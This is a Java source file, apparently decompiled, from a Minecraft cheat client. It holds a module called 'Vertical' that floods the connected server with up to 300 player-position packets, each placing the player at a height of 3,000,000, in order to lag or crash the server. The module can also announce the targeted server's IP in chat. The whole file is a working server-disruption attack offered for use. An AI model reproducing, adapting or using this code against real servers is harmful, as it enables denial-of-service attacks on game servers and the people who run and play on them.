package net.zebra.quiverone.modules.crash;

import net.minecraft.class_124;
import net.minecraft.class_2828.class_2829;
import net.zebra.quiverone.modules.Category;
import net.zebra.quiverone.modules.Module;
import net.zebra.quiverone.modules.setting.Setting;
import net.zebra.quiverone.modules.setting.settings.BooleanSetting;
import net.zebra.quiverone.modules.setting.settings.NumberSetting;

public class Vertical extends Module {
   private BooleanSetting sendMessage = new BooleanSetting("Send Message", this, true);
   private BooleanSetting autoDisable = new BooleanSetting("AutoDisable", this, true);
   public NumberSetting speed = new NumberSetting("Speed", this, 100.0D, 1.0D, 300.0D, 1.0D);

   public Vertical() {
      super("Vertical", "Attempts to lag the server", Category.CRASH, -1, false, true);
      this.addSetting(new Setting[]{this.speed, this.autoDisable, this.sendMessage});
   }

   public void onUpdate() {
      this.doVertical();
      if (this.sendMessage.isEnabled()) {
         sendMessage("Attempted to lag " + class_124.field_1079 + this.getIP() + class_124.field_1061 + " using" + class_124.field_1077 + " Vertical");
      }

      if (this.autoDisable.isEnabled()) {
         this.disable();
      }

   }

   private void doVertical() {
      double x = mc.field_1724.method_23317();
      double y = mc.field_1724.method_23318();
      double z = mc.field_1724.method_23321();
      class_2829 vertical = new class_2829(x, 3000000.0D, z, true);

      for(int i = 0; (double)i < this.speed.getValue(); ++i) {
         mc.method_1562().method_2883(vertical);
      }

   }
}
